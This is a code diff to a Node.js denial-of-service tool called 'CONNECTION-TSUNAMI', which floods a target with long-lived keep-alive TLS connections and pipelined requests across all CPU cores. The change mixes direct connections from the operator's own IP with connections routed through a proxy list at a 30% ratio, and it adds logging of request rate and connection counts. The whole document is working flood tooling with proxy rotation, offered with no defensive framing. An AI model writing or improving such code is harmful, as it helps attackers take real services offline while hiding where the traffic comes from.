@@ -1,6 +1,7 @@
 // R10-4: CONNECTION-TSUNAMI - Keep-Alive Connection Flood
 // Focus: Saturate connection limits
 // Technique: Long-lived connections + Pipelining
+// Updated: Mixed main IP + proxies
 
 const http = require('http');
 const https = require('https');
@@ -21,8 +22,12 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-4] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-4] No proxy.txt found, running without proxies');
+    console.log('[R10-4] No proxy.txt found, running with main IP only');
 }
+
+// Mix settings
+const USE_MAIN_IP = true;
+const MIX_RATIO = 0.3; // 30% main IP
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
@@ -35,7 +40,13 @@ class ConnectionPool {
         this.pool = [];
         this.target = target;
         this.size = size;
+        this.mainIpCount = 0;
+        this.proxyCount = 0;
         this.init();
+    }
+    
+    shouldUseMainIp() {
+        return USE_MAIN_IP && Math.random() < MIX_RATIO;
     }
     
     init() {
@@ -45,13 +56,16 @@ class ConnectionPool {
     }
     
     addConnection() {
-        if (proxies.length === 0) {
-            // Direct connection
+        const useMain = this.shouldUseMainIp();
+        
+        if (useMain || proxies.length === 0) {
+            // Direct connection (main IP)
             const tlsSocket = tls.connect(443, this.target.hostname, {
                 servername: this.target.hostname,
                 rejectUnauthorized: false
             }, () => {
                 this.pool.push(tlsSocket);
+                this.mainIpCount++;
             });
             
             tlsSocket.on('error', () => {
@@ -77,6 +91,7 @@ class ConnectionPool {
                     rejectUnauthorized: false
                 }, () => {
                     this.pool.push(tlsSocket);
+                    this.proxyCount++;
                 });
                 
                 tlsSocket.on('error', () => {
@@ -108,6 +123,7 @@ class ConnectionPool {
 
 if (cluster.isMaster) {
     console.log(`[R10-4] CONNECTION-TSUNAMI launching on ${CPU_CORES} cores`);
+    console.log(`[R10-4] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
@@ -127,7 +143,7 @@ if (cluster.isMaster) {
         }, 100);
         
         setInterval(() => {
-            console.log(`[R10-4] RPS: ${requestCount} | Pool: ${pool.pool.length}`);
+            console.log(`[R10-4] RPS: ${requestCount} | Pool: ${pool.pool.length} | Main: ${pool.mainIpCount} | Proxy: ${pool.proxyCount}`);
             requestCount = 0;
         }, 1000);
         
